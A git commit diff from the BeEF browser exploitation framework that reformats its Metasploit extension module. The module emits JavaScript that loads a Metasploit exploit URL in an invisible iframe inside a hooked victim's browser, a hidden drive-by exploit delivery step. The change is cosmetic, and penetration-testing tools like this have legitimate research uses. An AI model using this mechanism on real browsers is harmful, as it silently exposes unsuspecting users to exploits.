a26653719c6f2f4f679ce6f83c1d96537bc9a11b
Brendan Coles <bcoles@gmail.com>
2021-01-26 08:21:36 +0000

    rubocop -a extensions/metasploit

--- extensions/metasploit/module.rb
+++ extensions/metasploit/module.rb
@@ -6,25 +6,23 @@
 
 # This is a dummy module to fool BeEF's loading system
 class Msf_module < BeEF::Core::Command
-        def output
+  def output
+    command = BeEF::Core::Models::Command.find(@command_id)
+    data = JSON.parse(command['data'])
+    sploit_url = data[0]['sploit_url']
 
-	command = BeEF::Core::Models::Command.find(@command_id)
-	data = JSON.parse(command['data'])
-	sploit_url =  data[0]['sploit_url']
-
-      return "  
+    "
 beef.execute(function() {
-        var result; 
+        var result;
 
-        try { 
+        try {
                 var sploit = beef.dom.createInvisibleIframe();
                 sploit.src = '#{sploit_url}';
-        } catch(e) { 
-                for(var n in e) 
-                        result+= n + ' '  + e[n] ; 
-        } 
+        } catch(e) {
+                for(var n in e)
+                        result+= n + ' '  + e[n] ;
+        }
 
 });"
-        end
-
+  end
 end
